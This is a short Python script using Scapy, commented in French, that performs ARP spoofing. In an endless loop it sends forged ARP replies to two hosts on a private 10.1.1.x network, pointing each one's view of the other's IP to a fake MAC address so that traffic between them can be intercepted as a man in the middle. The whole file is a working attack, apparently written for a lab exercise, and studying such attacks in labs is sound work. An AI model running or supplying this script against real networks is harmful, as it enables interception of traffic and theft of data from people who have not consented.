from scapy.all import *
import time

spoof_mac = "00:15:5d:01:01:01"  # MAC falsifiée

target_ip_victime_1 = "10.1.1.101"   # Machine victime
spoof_ip_victime_1 = "10.1.1.10"   # IP usurpée


target_ip_victime_2 = "10.1.1.10"   # Machine victime
spoof_ip_victime_2 = "10.1.1.101"   # IP usurpée

while True:
	packet = ARP(op=2, pdst=target_ip_victime_1, psrc=spoof_ip_victime_1, hwsrc=spoof_mac)
	send(packet, verbose = True)
	packet = ARP(op=2, pdst=target_ip_victime_2, psrc=spoof_ip_victime_2, hwsrc=spoof_mac)
	send(packet, verbose = True)
	time.sleep(1)